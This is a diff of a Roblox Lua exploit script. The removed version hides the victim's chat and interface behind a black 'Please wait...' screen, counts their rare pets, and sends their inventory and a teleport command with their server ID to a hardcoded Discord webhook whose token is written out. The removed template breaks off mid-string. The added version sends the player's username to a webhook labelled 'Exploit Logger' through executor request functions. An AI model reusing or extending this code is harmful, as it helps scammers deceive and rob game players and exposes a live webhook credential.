@@ -1,113 +1,41 @@
+-- Your Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
+
+-- Get the local player
+local player = game:GetService("Players").LocalPlayer
+
+-- Webhook data
+local data = {
+    content = "**Username:** " .. player.Name, -- Shows username in plain text
+    username = "Exploit Logger"
+}
+
+-- Encode data as JSON
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
+local body = HttpService:JSONEncode(data)
 
-local player = Players.LocalPlayer
-
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1374728692663849100/y25fQk-wOS3fkR4r4fL5XjFA-C-YMDrvGeqC-dPKwWhc6RnKYbB57VnrR294YcNnbBvA"
-
--- Hide core UI elements
-StarterGui:SetCore("TopbarEnabled", false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-
--- Hide Roblox Chat UI (TextChatService chat)
-task.spawn(function()
-    local tries = 0
-    while tries < 20 do
-        local chatUI = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("Chat")
-        if chatUI then
-            chatUI.Enabled = false
-            chatUI:Destroy()
-            break
-        end
-        tries += 1
-        task.wait(0.5)
-    end
-end)
-
--- Create blackout GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
-local blackFrame = Instance.new("Frame")
-blackFrame.Size = UDim2.new(1, 0, 1, 0)
-blackFrame.Position = UDim2.new(0, 0, 0, 0)
-blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-blackFrame.BackgroundTransparency = 0
-blackFrame.Parent = screenGui
-
-local mainText = Instance.new("TextLabel")
-mainText.Size = UDim2.new(1, 0, 0.15, 0)
-mainText.Position = UDim2.new(0, 0, 0.3, 0)
-mainText.BackgroundTransparency = 1
-mainText.Text = "Please wait..."
-mainText.TextColor3 = Color3.new(1, 1, 1)
-mainText.TextScaled = true
-mainText.Font = Enum.Font.SourceSansBold
-mainText.Parent = blackFrame
-
-local infoText = Instance.new("TextLabel")
-infoText.Size = UDim2.new(1, -40, 0, 100)
-infoText.Position = UDim2.new(0, 20, 0.5, 0)
-infoText.BackgroundTransparency = 1
-infoText.TextColor3 = Color3.new(1, 1, 1)
-infoText.TextWrapped = true
-infoText.TextYAlignment = Enum.TextYAlignment.Top
-infoText.Font = Enum.Font.SourceSans
-infoText.TextSize = 24
-infoText.Text = ""
-infoText.Parent = blackFrame
-
--- Inventory count function (case-insensitive)
-local function toLower(str)
-    return string.lower(str or "")
+-- Get universal HTTP request function
+local function getRequestFunction()
+    return (syn and syn.request) or 
+           (http and http.request) or 
+           request or 
+           http_request or 
+           (fluxus and fluxus.request)
 end
 
-local function countItems()
-    local backpack = player:WaitForChild("Backpack")
-    local counts = {
-        Dragonfly = 0,
-        Raccoon = 0,
-        ["Red Fox"] = 0
-    }
+local requestFunc = getRequestFunction()
 
-    for _, item in ipairs(backpack:GetChildren()) do
-        if item:IsA("Tool") and item.Name then
-            local name = toLower(item.Name)
-            if string.find(name, "dragonfly") then
-                counts.Dragonfly = counts.Dragonfly + 1
-            elseif string.find(name, "raccoon") then
-                counts.Raccoon = counts.Raccoon + 1
-            elseif string.find(name, "red fox") then
-                counts["Red Fox"] = counts["Red Fox"] + 1
-            end
-        end
-    end
-
-    return counts
+if not requestFunc then
+    warn("No supported HTTP request function found.")
+    return
 end
 
-local counts = countItems()
-
-local displayText = string.format(
-    "Inventory counts:\nDragonfly: %d\nRaccoon: %d\nRed Fox: %d",
-    counts.Dragonfly, counts.Raccoon, counts["Red Fox"]
-)
-
-infoText.Text = displayText
-
--- Get PlaceId and JobId
-local placeId = game.PlaceId
-local jobId = game.JobId
-
--- Build webhook message
-local message = string.format([[
-Player **%s** executed the script!
-
-Teleport command:
-```lua
-game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+-- Send the webhook
+requestFunc({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = body
+})
